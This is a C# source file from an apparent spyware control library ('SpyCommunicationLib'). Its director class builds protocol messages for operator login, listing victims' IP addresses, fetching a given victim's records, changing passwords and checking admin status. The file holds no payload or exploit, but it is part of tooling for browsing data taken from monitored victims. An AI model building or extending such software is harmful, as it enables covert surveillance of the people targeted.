
using SpyCommunicationLib.Builders;

namespace SpyCommunicationLib.Directors
{
    /// <summary>
    /// Director for building user-related spy messages with token authorization.
    /// </summary>
    public class UserMessageDirector : TokenMessageDirector
    {
        private UserMessageBuilder _builder;

        /// <summary>
        /// Initializes a new instance of the <see cref="UserMessageDirector"/> class.
        /// </summary>
        public UserMessageDirector() : base()
        {
            _builder = new UserMessageBuilder();
        }

        /// <summary>
        /// Creates a login message with given username and password.
        /// </summary>
        /// <param name="username">User login name.</param>
        /// <param name="password">User password.</param>
        /// <returns>Configured SpyMessage for login.</returns>
        public SpyMessage GetLogginMessage(string username, string password)
        {
            _builder.SetAction(MessageAction.Login);
            _builder.SetOption("username", username);
            _builder.SetOption("password", password);
            return _builder.GetMessage();
        }

        /// <summary>
        /// Creates a message requesting the list of victims' IP addresses.
        /// </summary>
        /// <returns>SpyMessage to request victims IP list.</returns>
        public SpyMessage GetVictimsIpListMessage()
        {
            _builder.SetAction(MessageAction.GetVictimsIpList);
            ConfigureToken(_builder);
            return _builder.GetMessage();
        }

        /// <summary>
        /// Creates a message requesting records of a specified victim.
        /// </summary>
        /// <param name="victim_ip">Ip of the victim.</param>
        /// <returns>SpyMessage to get victim records.</returns>
        public SpyMessage GetVictimRecordsMessage(string victim_ip)
        {
            _builder.SetAction(MessageAction.GetVictimRecords);
            ConfigureToken(_builder);
            _builder.SetOption("vicrim_ip", victim_ip);
            return _builder.GetMessage();
        }

        /// <summary>
        /// Creates a message to change the user's password.
        /// </summary>
        /// <param name="new_password">New password string.</param>
        /// <returns>SpyMessage to request password change.</returns>
        public SpyMessage GetChangePasswordMessage(string new_password)
        {
            _builder.SetAction(MessageAction.ChangePassword);
            ConfigureToken(_builder);
            _builder.SetOption("new_password", new_password);
            return _builder.GetMessage();
        }

        /// <summary>
        /// Creates a message to check if the user has administrator status.
        /// </summary>
        /// <returns>SpyMessage to check admin status.</returns>
        public SpyMessage CheckAdminStatus()
        {
            _builder.SetAction(MessageAction.CheckAdminStatus);
            ConfigureToken(_builder);
            return _builder.GetMessage();
        }
    }
}
